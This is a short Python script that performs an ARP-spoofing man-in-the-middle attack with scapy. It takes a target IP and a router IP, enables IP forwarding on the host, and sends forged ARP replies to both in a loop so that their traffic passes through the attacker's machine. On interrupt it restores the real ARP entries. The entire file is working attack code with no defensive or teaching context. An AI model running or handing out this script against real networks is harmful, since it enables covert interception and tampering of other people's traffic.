
import scapy.all as scapy
import subprocess as sb
import optparse
import time
cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
sb.check_output(cmd,shell=True)
opt = optparse.OptionParser()
opt.add_option("-t","--targetip",dest="targetip",help="IP address of the target ")
opt.add_option("-r","--routerip",dest="routerip",help="IP address of the router ")

(user_input,arg) = opt.parse_args()
def get_mac(victim_ip):

        arp_request_packet = scapy.ARP(pdst=victim_ip)
        arp_brodcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        combined_packet = arp_brodcast_packet / arp_request_packet
        clients = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
        return clients[0][1].hwsrc

def spoof(victim_ip,router_ip):
	victim_mac = get_mac(victim_ip)
	arp_responce = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=router_ip)
	scapy.send(arp_responce,verbose=False)
	
def reset(victim_ip,router_ip):
	victim_mac = get_mac(victim_ip)
	router_mac = get_mac(router_ip)
	arp_responce = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=router_ip,hwsrc=router_mac)
	scapy.send(arp_responce,verbose=False,count=6)
try:
    packet=0
    while True:
        
        spoof(user_input.routerip,user_input.targetip)
        spoof(user_input.targetip,user_input.routerip)
        print("\rSending packet {}".format(packet),end='')
        packet+=2
        time.sleep(1)
except KeyboardInterrupt:
	
    reset(user_input.targetip,user_input.routerip)
    reset(user_input.routerip,user_input.targetip)
    print("\nmitm ended!")
    cmd = "echo 0 > /proc/sys/net/ipv4/ip_forward"
    sb.check_output(cmd,shell=True)
    
